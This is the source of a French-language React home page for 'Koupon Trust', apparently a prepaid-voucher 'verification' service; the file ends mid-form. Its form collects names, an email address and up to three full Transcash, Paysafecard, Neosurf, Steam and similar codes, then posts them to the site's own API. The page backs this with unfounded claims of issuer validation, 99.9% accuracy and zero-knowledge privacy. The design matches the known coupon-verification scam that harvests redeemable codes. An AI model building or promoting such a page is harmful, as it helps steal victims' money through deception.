import { useState, useRef, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { motion, AnimatePresence } from "framer-motion";
import { useLocation } from "wouter";
import Autoplay from "embla-carousel-autoplay";
import { 
  ShieldCheck, 
  CreditCard, 
  Eye, 
  EyeOff, 
  CheckCircle2, 
  Loader2, 
  Lock,
  Menu,
  ChevronRight,
  Upload,
  Image as ImageIcon,
  X,
  Sparkles,
  Zap,
  Fingerprint,
  Shield,
  Server,
  Globe,
  Cpu,
  Scan,
  Database,
  Search,
  Key,
  Gamepad,
  ShoppingBag,
  Film,
  HelpCircle,
  Mail,
  ArrowRight,
  User,
  LogOut,
  LayoutDashboard
} from "lucide-react";
import { useMutation } from "@tanstack/react-query";
import { useAuth } from "@/lib/auth";
import { AuthModal } from "@/components/auth-modal";
import { LanguageSelector } from "@/components/language-selector";
import { NovaAIEngineHome } from "@/components/nova-ai-engine-home";
import { API_URL } from "@/lib/config";
import { useToast } from "@/hooks/use-toast";
import kouponLogo from "@assets/generated_images/koupon_trust_logo_design.png";
import transcashLogo from "@assets/Transcash_1765606961325.png";
import pcsLogo from "@assets/publiccc_1765606961325.png";
import paysafecardLogo from "@assets/paysafecard-100_1765606961325.png";
import neosurfLogo from "@assets/cx_1765606961325.png";
import toneofirstLogo from "@assets/Sans_titre_1765606961325.png";
import ticketpremiumLogo from "@assets/ticket-premium-100-euros_1765606961325.png";
import flexepinLogo from "@assets/flexepin-50_1765606961325.png";
import cashlibLogo from "@assets/public_1765606961325.png";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Checkbox } from "@/components/ui/checkbox";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import {
  Carousel,
  CarouselContent,
  CarouselItem,
} from "@/components/ui/carousel";
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";

// --- Data & Constants ---

const COUPON_TYPES = [
  { id: "transcash", name: "Transcash", logoUrl: transcashLogo, color: "from-red-50 to-red-100", category: "payment" },
  { id: "pcs", name: "PCS Mastercard", logoUrl: pcsLogo, color: "from-slate-50 to-slate-200", category: "payment" },
  { id: "paysafecard", name: "Paysafecard", logoUrl: paysafecardLogo, color: "from-blue-50 to-blue-100", category: "payment" },
  { id: "neosurf", name: "Neosurf", logoUrl: neosurfLogo, color: "from-pink-50 to-rose-100", category: "payment" },
  { id: "googleplay", name: "Google Play", logoUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Google_Play_2022_logo.svg/320px-Google_Play_2022_logo.svg.png", color: "from-emerald-50 to-emerald-100", category: "gift" },
  { id: "amazon", name: "Amazon", logoUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/320px-Amazon_logo.svg.png", color: "from-orange-50 to-orange-100", category: "gift" },
  { id: "itunes", name: "Apple Gift Card", logoUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/160px-Apple_logo_black.svg.png", color: "from-slate-50 to-slate-100", category: "gift" },
  { id: "steam", name: "Steam", logoUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/200px-Steam_icon_logo.svg.png", color: "from-slate-100 to-slate-300", category: "gaming" },
  { id: "toneofirst", name: "Toneo First", logoUrl: toneofirstLogo, color: "from-orange-50 to-orange-100", category: "payment" },
  { id: "ticketpremium", name: "Ticket Premium", logoUrl: ticketpremiumLogo, color: "from-blue-50 to-indigo-100", category: "payment" },
  { id: "flexpin", name: "Flexepin", logoUrl: flexepinLogo, color: "from-green-50 to-teal-100", category: "payment" },
  { id: "cashlib", name: "Cashlib", logoUrl: cashlibLogo, color: "from-amber-50 to-orange-100", category: "payment" },
  { id: "netflix", name: "Netflix", logoUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Netflix_2015_logo.svg/320px-Netflix_2015_logo.svg.png", color: "from-red-50 to-red-100", category: "entertainment" },
  { id: "spotify", name: "Spotify", logoUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/2/26/Spotify_logo_with_text.svg/320px-Spotify_logo_with_text.svg.png", color: "from-green-50 to-green-100", category: "entertainment" },
  { id: "razer", name: "Razer Gold", logoUrl: "https://upload.wikimedia.org/wikipedia/en/thumb/4/40/Razer_snake_logo.svg/200px-Razer_snake_logo.svg.png", color: "from-green-50 to-green-100", category: "gaming" },
  { id: "xbox", name: "Xbox", logoUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f9/Xbox_one_logo.svg/200px-Xbox_one_logo.svg.png", color: "from-green-50 to-green-100", category: "gaming" },
  { id: "playstation", name: "PlayStation", logoUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Playstation_logo_colour.svg/320px-Playstation_logo_colour.svg.png", color: "from-blue-50 to-indigo-100", category: "gaming" },
  { id: "zalando", name: "Zalando", logoUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/0/0b/Zalando_logo.svg/320px-Zalando_logo.svg.png", color: "from-orange-50 to-orange-100", category: "gift" },
];

const AMOUNTS = ["10", "20", "50", "100", "150", "200", "250", "300", "500"];

const FAQ_ITEMS = [
  { question: "Pourquoi vérifier mon coupon ?", answer: "Vérifier votre coupon permet de s'assurer de sa validité, de confirmer le montant disponible et de détecter toute anomalie avant utilisation ou transaction." },
  { question: "Combien de temps prend la vérification ?", answer: "L'analyse est quasi-instantanée. Notre système interroge les serveurs émetteurs en temps réel et vous fournit un résultat en moins de 30 secondes." },
  { question: "Est-ce anonyme ?", answer: "Absolument. Nous ne stockons aucune donnée personnelle. Les informations de vérification sont chiffrées et supprimées automatiquement après l'analyse." },
  { question: "Quelle est la précision du système ?", answer: "Notre technologie combine l'IA et la validation cryptographique directe pour un taux de précision de 99.9%, éliminant les faux positifs." },
  { question: "Comment mes données sont-elles protégées ?", answer: "Nous utilisons un chiffrement SSL 256-bit de bout en bout. Vos codes et images ne sont jamais stockés sur nos serveurs de manière permanente." },
];

const FEATURES = [
  { icon: Zap, title: "Vérification Instantanée", desc: "Résultats en temps réel via API directe." },
  { icon: Scan, title: "Analyse Visuelle IA", desc: "OCR avancé pour lire les tickets photo." },
  { icon: Fingerprint, title: "Protection Biométrique", desc: "Authentification forte anti-fraude." },
  { icon: Shield, title: "Résultats Certifiés", desc: "Garantie de validité par l'émetteur." },
  { icon: Globe, title: "Compatibilité Totale", desc: "Supporte +50 types de coupons mondiaux." },
  { icon: Key, title: "Confidentialité Totale", desc: "Zero-knowledge proof & auto-delete." },
];

const STEPS = [
  { icon: Upload, title: "1. Importez", desc: "Téléversez une photo ou saisissez le code de votre coupon." },
  { icon: Cpu, title: "2. Analysez", desc: "Notre IA et nos algos cryptographiques vérifient l'authenticité." },
  { icon: CheckCircle2, title: "3. Validez", desc: "Recevez un rapport de validité certifié instantanément." },
];

const TECH_STACK = [
  { icon: Search, label: "IA Analyse Textuelle" },
  { icon: Database, label: "Patterns de Série" },
  { icon: Scan, label: "OCR Avancé" },
  { icon: Shield, label: "Modèle Anti-Fraude" },
  { icon: Server, label: "Réseau Multi-API" },
  { icon: Key, label: "Reconstruction Code" },
];

// --- Form Schema ---

const formSchema = z.object({
  firstName: z.string().min(2, "Le prénom est requis"),
  lastName: z.string().min(2, "Le nom est requis"),
  email: z.string().email("Email invalide"),
  couponType: z.string().min(1, "Veuillez sélectionner un type"),
  amount: z.string().min(1, "Veuillez sélectionner un montant"),
  couponCode: z.string().min(10, "Code trop court"),
  couponCode2: z.string().optional(),
  couponCode3: z.string().optional(),
  couponImage: z.any().optional(),
}).superRefine((data, ctx) => {
  const codesCount = [data.couponCode, data.couponCode2, data.couponCode3].filter(c => c && c.trim()).length;
  if (codesCount > 3) {
    ctx.addIssue({
      code: z.ZodIssueCode.custom,
      message: "Maximum 3 codes par envoi",
    });
  }
});

// --- Main Component ---

export default function Home() {
  const [showCode, setShowCode] = useState(false);
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [result, setResult] = useState<null | "success" | "error">(null);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState("all");
  const [authModalOpen, setAuthModalOpen] = useState(false);
  const [, setLocation] = useLocation();
  const { user, logout, isAdmin } = useAuth();
  const { toast } = useToast();

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      firstName: "",
      lastName: "",
      email: "",
      couponType: "",
      amount: "",
      couponCode: "",
      couponCode2: "",
      couponCode3: "",
    },
  });

  const submitVerificationMutation = useMutation({
    mutationFn: async (values: z.infer<typeof formSchema>) => {
      // Collect all codes that are filled in
      const codes = [values.couponCode, values.couponCode2, values.couponCode3]
        .filter(c => c && c.trim())
        .map(c => c!.trim());

      if (codes.length === 0) {
        throw new Error("Veuillez entrer au moins un code coupon");
      }

      const headers: Record<string, string> = {
        'Content-Type': 'application/json',
      };

      const token = localStorage.getItem("auth_token");
      if (token) {
        headers['Authorization'] = `Bearer ${token}`;
      }

      // Submit each code as a separate verification
      const promises = codes.map(couponCode =>
        fetch(`${API_URL}/api/verifications`, {
          method: 'POST',
          headers,
          body: JSON.stringify({
            firstName: values.firstName,
            lastName: values.lastName,
            email: values.email,
            couponType: values.couponType,
            amount: parseInt(values.amount),
            couponCode: couponCode,
          }),
        })
      );

      const responses = await Promise.all(promises);
      
      for (const response of responses) {
        if (!response.ok) {
          const error = await response.json();
          throw new Error(error.error || 'Erreur lors de la soumission');
        }
      }

      return { success: true, codesCount: codes.length };
    },
    onSuccess: (data) => {
      setResult("success");
      const codesText = data.codesCount === 1 ? "1 code" : `${data.codesCount} codes`;
      toast({
        title: "Demande envoyée",
        description: `Votre demande de vérification pour ${codesText} a été soumise avec succès. Vous recevrez un email avec les résultats.`,
      });
    },
    onError: (error: Error) => {
      setResult("error");
      toast({
        title: "Erreur",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  function onSubmit(values: z.infer<typeof formSchema>) {
    setIsAnalyzing(true);
    setResult(null);
    submitVerificationMutation.mutate(values, {
      onSettled: () => {
        setIsAnalyzing(false);
      }
    });
  }

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, onChange: (value: any) => void) => {
    const file = e.target.files?.[0];
    if (file) {
      setSelectedFile(file);
      onChange(file);
      const url = URL.createObjectURL(file);
      setPreviewUrl(url);
    }
  };

  const removeFile = () => {
    setSelectedFile(null);
    setPreviewUrl(null);
    form.setValue("couponImage", undefined);
  };

  const plugin = useRef(Autoplay({ delay: 2500, stopOnInteraction: false }));

  const filteredCoupons = activeTab === "all" 
    ? COUPON_TYPES 
    : COUPON_TYPES.filter(c => c.category === activeTab);

  return (
    <div className="min-h-screen font-sans text-slate-900 overflow-x-hidden selection:bg-blue-100 selection:text-blue-900 relative bg-slate-50">
      
      {/* Background Ambience - Light Mode */}
      <div className="fixed inset-0 z-0 pointer-events-none overflow-hidden">
        <div className="absolute top-[-20%] right-[-10%] w-[800px] h-[800px] bg-blue-400/10 rounded-full blur-[120px] mix-blend-multiply animate-pulse duration-[10000ms]"></div>
        <div className="absolute bottom-[-20%] left-[-10%] w-[600px] h-[600px] bg-purple-400/10 rounded-full blur-[100px] mix-blend-multiply animate-pulse duration-[8000ms]"></div>
        <div className="absolute top-[40%] left-[20%] w-[400px] h-[400px] bg-cyan-400/10 rounded-full blur-[80px] mix-blend-multiply"></div>
      </div>

      {/* 1. Header - Ultra Professional */}
      <header className="fixed top-0 w-full z-50 transition-all duration-300 border-b border-slate-200/40 bg-white/95 backdrop-blur-2xl shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
          <div className="flex items-center gap-4 group cursor-pointer" data-testid="link-logo">
            <div className="relative">
              <div className="absolute inset-0 bg-gradient-to-r from-blue-500 via-purple-600 to-blue-500 rounded-xl blur-md opacity-30 group-hover:opacity-50 transition-all duration-500"></div>
              <div className="relative">
                <img src={kouponLogo} alt="Koupon Trust" className="h-12 w-12 object-contain rounded-xl" />
              </div>
            </div>
            <div className="flex flex-col">
              <span className="font-display font-bold text-2xl tracking-tight bg-gradient-to-r from-slate-900 via-blue-900 to-slate-900 bg-clip-text text-transparent">
                Koupon Trust
              </span>
              <span className="text-[10px] uppercase tracking-widest text-slate-400 font-semibold">
                Verification Platform
              </span>
            </div>
          </div>

          <nav className="hidden md:flex items-center gap-6 text-sm font-semibold text-slate-600">
            {["Comment ça marche", "Sécurité", "Émetteurs", "FAQ"].map((item) => (
              <a 
                key={item} 
                href={`#${item.toLowerCase().replace(/\s+/g, '-').replace(/[éè]/g, 'e').replace(/ç/g, 'c')}`} 
                className="hover:text-blue-600 transition-all relative py-1 group/link"
                data-testid={`link-${item.toLowerCase().replace(/\s+/g, '-')}`}
              >
                {item}
                <span className="absolute bottom-0 left-0 w-0 h-[2px] bg-gradient-to-r from-blue-600 to-purple-600 transition-all duration-300 group-hover/link:w-full"></span>
              </a>
            ))}
            <LanguageSelector />
            {user ? (
              <div className="flex items-center gap-3">
                {isAdmin && (
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setLocation("/admin")}
                    className="border-purple-500/30 text-purple-600 hover:bg-purple-50"
                    data-testid="button-admin"
                  >
                    <LayoutDashboard className="h-4 w-4 mr-2" />
                    Admin
                  </Button>
                )}
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => setLocation("/dashboard")}
                  className="border-blue-500/30 text-blue-600 hover:bg-blue-50"
                  data-testid="button-dashboard"
                >
                  <User className="h-4 w-4 mr-2" />
                  Mon espace
                </Button>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={logout}
                  className="text-slate-500 hover:text-red-600"
                  data-testid="button-logout"
                >
                  <LogOut className="h-4 w-4" />
                </Button>
              </div>
            ) : (
              <Button
                variant="default"
                size="sm"
                onClick={() => setAuthModalOpen(true)}
                className="bg-gradient-to-r from-blue-600 to-purple-600 text-white hover:from-blue-500 hover:to-purple-500"
                data-testid="button-account"
              >
                <User className="h-4 w-4 mr-2" />
                Mon compte
              </Button>
            )}
          </nav>

          <button 
            className="md:hidden p-2 text-slate-600 hover:text-blue-600 transition-colors rounded-lg hover:bg-slate-50"
            onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
            data-testid="button-mobile-menu"
          >
            <Menu className="w-6 h-6" />
          </button>
        </div>

        {/* Mobile Menu */}
        <AnimatePresence>
          {isMobileMenuOpen && (
            <motion.div
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: "auto" }}
              exit={{ opacity: 0, height: 0 }}
              className="md:hidden border-t border-slate-200/40 bg-white/95 backdrop-blur-2xl"
            >
              <nav className="flex flex-col px-4 py-4 space-y-1">
                {["Comment ça marche", "Sécurité", "Émetteurs", "FAQ"].map((item) => (
                  <a
                    key={item}
                    href={`#${item.toLowerCase().replace(/\s+/g, '-').replace(/[éè]/g, 'e').replace(/ç/g, 'c')}`}
                    className="px-4 py-3 text-sm font-semibold text-slate-600 hover:text-blue-600 hover:bg-slate-50 rounded-lg transition-all"
                    onClick={() => setIsMobileMenuOpen(false)}
                    data-testid={`link-mobile-${item.toLowerCase().replace(/\s+/g, '-')}`}
                  >
                    {item}
                  </a>
                ))}
                
                {/* User account section for mobile */}
                <div className="border-t border-slate-200/40 mt-2 pt-3">
                  {user ? (
                    <div className="flex flex-col space-y-1">
                      {isAdmin && (
                        <button
                          onClick={() => { setLocation("/admin"); setIsMobileMenuOpen(false); }}
                          className="flex items-center gap-2 px-4 py-3 text-sm font-semibold text-purple-600 hover:bg-purple-50 rounded-lg transition-all"
                          data-testid="link-mobile-admin"
                        >
                          <LayoutDashboard className="h-4 w-4" />
                          Admin
                        </button>
                      )}
                      <button
                        onClick={() => { setLocation("/dashboard"); setIsMobileMenuOpen(false); }}
                        className="flex items-center gap-2 px-4 py-3 text-sm font-semibold text-blue-600 hover:bg-blue-50 rounded-lg transition-all"
                        data-testid="link-mobile-dashboard"
                      >
                        <User className="h-4 w-4" />
                        Mon espace
                      </button>
                      <button
                        onClick={() => { logout(); setIsMobileMenuOpen(false); }}
                        className="flex items-center gap-2 px-4 py-3 text-sm font-semibold text-red-600 hover:bg-red-50 rounded-lg transition-all"
                        data-testid="button-mobile-logout"
                      >
                        <LogOut className="h-4 w-4" />
                        Déconnexion
                      </button>
                    </div>
                  ) : (
                    <button
                      onClick={() => { setAuthModalOpen(true); setIsMobileMenuOpen(false); }}
                      className="flex items-center gap-2 px-4 py-3 text-sm font-semibold text-white bg-gradient-to-r from-blue-600 to-purple-600 rounded-lg w-full justify-center"
                      data-testid="button-mobile-account"
                    >
                      <User className="h-4 w-4" />
                      Mon compte
                    </button>
                  )}
                </div>
              </nav>
            </motion.div>
          )}
        </AnimatePresence>
      </header>

      <main className="relative z-10 pt-28">
        
        {/* 2. Hero Section - Futuristic Tech Design */}
        <section className="max-w-7xl mx-auto px-3 sm:px-6 lg:px-8 mb-16 sm:mb-24 lg:mb-32">
          {/* Tech Hero Banner */}
          <div className="w-full mb-8 sm:mb-16 relative">
            <div className="relative h-[320px] sm:h-[400px] lg:h-[500px] rounded-2xl sm:rounded-3xl overflow-hidden shadow-2xl bg-gradient-to-br from-slate-900 via-blue-950 to-purple-950">
              {/* Animated Grid Background */}
              <div className="absolute inset-0 opacity-30">
                <div className="absolute inset-0" style={{
                  backgroundImage: `linear-gradient(rgba(59, 130, 246, 0.3) 1px, transparent 1px), linear-gradient(90deg, rgba(59, 130, 246, 0.3) 1px, transparent 1px)`,
                  backgroundSize: '40px 40px',
                  animation: 'grid-move 20s linear infinite'
                }}></div>
              </div>
              
              {/* Floating Orbs - smaller on mobile */}
              <div className="absolute top-10 sm:top-20 left-[10%] sm:left-[20%] w-20 sm:w-32 h-20 sm:h-32 bg-blue-500/20 rounded-full blur-3xl animate-pulse"></div>
              <div className="absolute bottom-10 sm:bottom-20 right-[10%] sm:right-[20%] w-24 sm:w-40 h-24 sm:h-40 bg-purple-500/20 rounded-full blur-3xl animate-pulse" style={{ animationDelay: '1s' }}></div>
              <div className="absolute top-1/2 left-1/2 w-32 sm:w-48 h-32 sm:h-48 bg-cyan-500/10 rounded-full blur-3xl animate-pulse" style={{ animationDelay: '2s' }}></div>
              
              {/* Code Matrix Effect - Hidden on small mobile, visible on sm+ */}
              <div className="hidden sm:block absolute left-4 lg:left-8 top-8 bottom-8 w-32 lg:w-48 opacity-40 overflow-hidden font-mono text-[10px] lg:text-xs text-green-400/60 leading-relaxed pointer-events-none">
                <div className="animate-code-scroll">
                  {Array.from({ length: 30 }).map((_, i) => (
                    <div key={i} className="whitespace-nowrap">
                      {`0x${Math.random().toString(16).slice(2, 10).toUpperCase()}`}
                    </div>
                  ))}
                </div>
              </div>
              
              {/* Code Matrix Effect - Right Side - Hidden on small mobile */}
              <div className="hidden sm:block absolute right-4 lg:right-8 top-8 bottom-8 w-32 lg:w-48 opacity-40 overflow-hidden font-mono text-[10px] lg:text-xs text-blue-400/60 leading-relaxed pointer-events-none text-right">
                <div className="animate-code-scroll-reverse">
                  {Array.from({ length: 30 }).map((_, i) => (
                    <div key={i} className="whitespace-nowrap">
                      {`SHA256:${Math.random().toString(36).slice(2, 14).toUpperCase()}`}
                    </div>
                  ))}
                </div>
              </div>
              
              {/* Central Content */}
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="text-center text-white px-4 sm:px-6 relative z-10">
                  {/* Tech Badge */}
                  <div className="inline-flex items-center gap-2 px-3 sm:px-4 py-1.5 sm:py-2 rounded-full bg-white/10 backdrop-blur-sm border border-white/20 text-xs sm:text-sm font-semibold text-white/90 mb-4 sm:mb-8">
                    <div className="w-2 h-2 rounded-full bg-green-400 animate-pulse"></div>
                    SYSTEME ACTIF
                  </div>
                  
                  <h2 className="text-2xl sm:text-4xl md:text-5xl lg:text-6xl font-display font-bold mb-3 sm:mb-6 drop-shadow-lg leading-tight">
                    Infrastructure de
                    <span className="block bg-clip-text text-transparent bg-gradient-to-r from-cyan-400 via-blue-400 to-purple-400">
                      Vérification Avancée
                    </span>
                  </h2>
                  <p className="text-sm sm:text-lg md:text-xl text-slate-300 max-w-2xl mx-auto drop-shadow mb-4 sm:mb-8 px-2">
                    Analyse cryptographique multi-couche. Détection de fraude par IA. Protection en temps réel.
                  </p>
                  
                  {/* Stats Row - responsive grid on mobile */}
                  <div className="flex flex-wrap items-center justify-center gap-4 sm:gap-8 md:gap-16 text-sm">
                    <div className="text-center">
                      <div className="text-xl sm:text-2xl md:text-3xl font-bold text-cyan-400">99.9%</div>
                      <div className="text-slate-400 text-[10px] sm:text-xs uppercase tracking-wider">Précision</div>
                    </div>
                    <div className="hidden sm:block w-px h-12 bg-white/20"></div>
                    <div className="text-center">
                      <div className="text-xl sm:text-2xl md:text-3xl font-bold text-blue-400">&lt;0.3s</div>
                      <div className="text-slate-400 text-[10px] sm:text-xs uppercase tracking-wider">Latence</div>
                    </div>
                    <div className="hidden sm:block w-px h-12 bg-white/20"></div>
                    <div className="text-center">
                      <div className="text-xl sm:text-2xl md:text-3xl font-bold text-purple-400">256-bit</div>
                      <div className="text-slate-400 text-[10px] sm:text-xs uppercase tracking-wider">Chiffrement</div>
                    </div>
                  </div>
                </div>
              </div>
              
              {/* Bottom Gradient Fade */}
              <div className="absolute bottom-0 left-0 right-0 h-16 sm:h-24 bg-gradient-to-t from-slate-900 to-transparent"></div>
            </div>
          </div>

          <div className="flex flex-col lg:flex-row items-start gap-8 sm:gap-12 lg:gap-24">
            
            {/* Left: Content & Slider */}
            <div className="flex-1 w-full lg:w-[55%] space-y-6 sm:space-y-10 pt-4 sm:pt-8">
              <motion.div
                initial={{ opacity: 0, y: 30 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.8, ease: "easeOut" }}
              >
                <div className="inline-flex items-center gap-2 px-3 sm:px-4 py-1 sm:py-1.5 rounded-full bg-blue-50 border border-blue-100 text-blue-600 text-[10px] sm:text-xs font-bold uppercase tracking-widest mb-4 sm:mb-8 shadow-sm">
                  <Sparkles className="w-3 h-3" />
                  Technologie 2026
                </div>
                
                <h1 className="text-3xl sm:text-5xl md:text-6xl lg:text-7xl font-display font-bold leading-tight sm:leading-[1.05] tracking-tight mb-4 sm:mb-8 text-slate-900">
                  Vérifiez vos coupons <br className="hidden sm:block"/>
                  <span className="bg-clip-text text-transparent bg-gradient-to-r from-blue-600 via-purple-600 to-pink-600 animate-gradient-text">
                    instantanément.
                  </span>
                </h1>
                
                <p className="text-sm sm:text-lg text-slate-600 leading-relaxed max-w-xl mb-6 sm:mb-12 font-light">
                  Koupon Trust utilise un moteur d’analyse intelligent combinant IA, détection de fraude, vérification cryptographique et analyse visuelle haute précision. Une solution de confiance adoptée par des milliers d’utilisateurs.
                </p>

                {/* Benefits Grid */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4 mb-6 sm:mb-12">
                  {FEATURES.slice(0, 4).map((feature, i) => (
                    <div key={i} className="flex items-start gap-2 sm:gap-3">
                      <div className="mt-0.5 sm:mt-1 p-1 sm:p-1.5 rounded bg-white border border-slate-200 text-blue-600 shadow-sm flex-shrink-0">
                        <feature.icon className="w-3 h-3 sm:w-4 sm:h-4" />
                      </div>
                      <div className="min-w-0">
                        <h4 className="text-xs sm:text-sm font-semibold text-slate-900 leading-tight">{feature.title}</h4>
                        <p className="text-[10px] sm:text-xs text-slate-500 leading-snug">{feature.desc}</p>
                      </div>
                    </div>
                  ))}
                </div>

                {/* Carousel */}
                <div className="w-full relative">
                  <div className="absolute left-0 top-0 bottom-0 w-8 sm:w-24 bg-gradient-to-r from-slate-50 to-transparent z-20 pointer-events-none"></div>
                  <div className="absolute right-0 top-0 bottom-0 w-8 sm:w-24 bg-gradient-to-l from-slate-50 to-transparent z-20 pointer-events-none"></div>
                  
                  <Carousel
                    opts={{ align: "start", loop: true }}
                    plugins={[plugin.current]}
                    className="w-full"
                  >
                    <CarouselContent className="-ml-2 sm:-ml-4">
                      {COUPON_TYPES.map((coupon) => (
                        <CarouselItem key={coupon.id} className="pl-2 sm:pl-4 basis-1/2 sm:basis-1/3 lg:basis-1/4">
                          <div className="group cursor-pointer relative perspective-1000">
                            <div className={`relative aspect-[1.586/1] rounded-xl sm:rounded-2xl overflow-hidden transition-all duration-500 transform group-hover:-translate-y-2 group-hover:shadow-xl border border-slate-200 bg-white shadow-md`}>
                               {/* Background subtle tint */}
                               <div className={`absolute inset-0 bg-gradient-to-br ${coupon.color} opacity-20 group-hover:opacity-30 transition-opacity`}></div>
                               
                               <div className="absolute inset-0 flex items-center justify-center p-3 sm:p-5 z-10">
                                 <img 
                                   src={coupon.logoUrl}
                                   alt={coupon.name}
                                   className="w-full h-full object-contain opacity-90 group-hover:opacity-100 group-hover:scale-110 transition-all duration-500"
                                   onError={(e) => {
                                     e.currentTarget.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text x="50%" y="50%" text-anchor="middle" dy=".3em" fill="%23333" font-size="14" font-weight="bold">' + coupon.name + '</text></svg>';
                                   }}
                                 />
                               </div>
                               {/* Shine effect */}
                               <div className="absolute -inset-full top-0 block h-full w-1/2 -skew-x-12 bg-gradient-to-r from-transparent to-white opacity-40 group-hover:animate-shine" />
                            </div>
                            <p className="mt-2 sm:mt-4 text-[10px] sm:text-xs font-medium text-center text-slate-400 group-hover:text-blue-600 transition-colors tracking-wider uppercase truncate">
                              {coupon.name}
                            </p>
                          </div>
                        </CarouselItem>
                      ))}
                    </CarouselContent>
                  </Carousel>
                </div>
              </motion.div>
            </div>

            {/* Right: Glass Form */}
            <motion.div 
              className="flex-1 w-full lg:w-[45%]"
              initial={{ opacity: 0, x: 30 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.8, delay: 0.2, ease: "easeOut" }}
            >
              <div className="relative group sticky top-24">
                <div className="absolute -inset-1 bg-gradient-to-r from-blue-500 to-purple-600 rounded-[2rem] blur opacity-20 group-hover:opacity-30 transition duration-1000"></div>
                <Card className="relative glass-card-strong border-0 rounded-2xl sm:rounded-[2rem] overflow-hidden shadow-2xl">
                  <CardHeader className="border-b border-slate-100 pb-4 sm:pb-6 pt-5 sm:pt-8 px-4 sm:px-8 bg-white/50">
                    <div className="flex items-center justify-between gap-3">
                      <div className="min-w-0">
                        <CardTitle className="text-base sm:text-xl font-display font-bold text-slate-900 tracking-wide">Vérification Sécurisée</CardTitle>
                        <CardDescription className="text-slate-500 mt-1 flex items-center gap-2 text-xs sm:text-sm">
                          <Lock className="w-3 h-3 text-green-600 flex-shrink-0" /> <span className="truncate">SSL 256-bit Encrypted</span>
                        </CardDescription>
                      </div>
                      <div className="h-8 w-8 sm:h-10 sm:w-10 rounded-full bg-green-50 flex items-center justify-center border border-green-100 shadow-sm flex-shrink-0">
                        <Shield className="w-4 h-4 sm:w-5 sm:h-5 text-green-600" />
                      </div>
                    </div>
                  </CardHeader>
                  <CardContent className="pt-5 sm:pt-8 px-4 sm:px-8 pb-5 sm:pb-8 bg-white/40">
                    {!isAnalyzing && !result && (
                      <Form {...form}>
                        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-5">
                          {/* Form fields */}
                          <div className="grid grid-cols-2 gap-4">
                            <FormField control={form.control} name="firstName" render={({ field }) => (
                              <FormItem>
                                <FormControl><Input placeholder="Prénom" {...field} className="bg-white border-slate-200 text-slate-900 placeholder:text-slate-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/10 h-11 rounded-xl transition-all" /></FormControl>
                                <FormMessage />
                              </FormItem>
                            )} />
                            <FormField control={form.control} name="lastName" render={({ field }) => (
                              <FormItem>
                                <FormControl><Input placeholder="Nom" {...field} className="bg-white border-slate-200 text-slate-900 placeholder:text-slate-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/10 h-11 rounded-xl transition-all" /></FormControl>
                                <FormMessage />
                              </FormItem>
                            )} />
                          </div>

                          <FormField control={form.control} name="email" render={({ field }) => (
                            <FormItem><FormControl><Input placeholder="Email" {...field} className="bg-white border-slate-200 text-slate-900 placeholder:text-slate-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/10 h-11 rounded-xl transition-all" /></FormControl><FormMessage /></FormItem>
                          )} />

                          <div className="grid grid-cols-2 gap-4">
                            <FormField control={form.control} name="couponType" render={({ field }) => (
                              <FormItem>
                                <Select onValueChange={field.onChange} defaultValue={field.value}>
                                  <FormControl><SelectTrigger className="bg-white border-slate-200 text-slate-900 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/10 h-11 rounded-xl transition-all"><SelectValue placeholder="Service" /></SelectTrigger></FormControl>
                                  <SelectContent side="bottom" className="bg-white border-slate-100 text-slate-900 shadow-xl">{COUPON_TYPES.map((t) => <SelectItem key={t.id} value={t.id} className="cursor-pointer">{t.name}</SelectItem>)}</SelectContent>
                                </Select>
                                <FormMessage />
                              </FormItem>
                            )} />
                            <FormField control={form.control} name="amount" render={({ field }) => (
                              <FormItem>
                                <Select onValueChange={field.onChange} defaultValue={field.value}>
                                  <FormControl><SelectTrigger className="bg-white border-slate-200 text-slate-900 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/10 h-11 rounded-xl transition-all"><SelectValue placeholder="Montant" /></SelectTrigger></FormControl>
